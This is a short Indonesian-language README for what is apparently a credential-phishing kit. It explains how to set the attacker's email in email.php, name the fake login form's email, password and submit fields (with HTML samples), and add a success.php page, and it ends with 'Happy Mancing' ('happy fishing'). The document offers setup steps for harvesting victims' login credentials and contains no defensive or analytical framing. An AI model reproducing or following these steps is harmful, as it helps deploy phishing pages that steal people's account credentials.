1. Buka file email.php ganti email menjadi email anda.
2. ubah name pada input email dan password menjadi "email" "password" "login". contoh : 
<input type="text" name="email">
<input type="password" name="password">
<button type="submit" name="login">Masuk</button>
3. Buat file akhir / tampilan sukses anda, dan berinama file itu "success.php" agar script berjalan dengan normal.
4. Happy Mancing :)

// KH's Code
// Idhaam69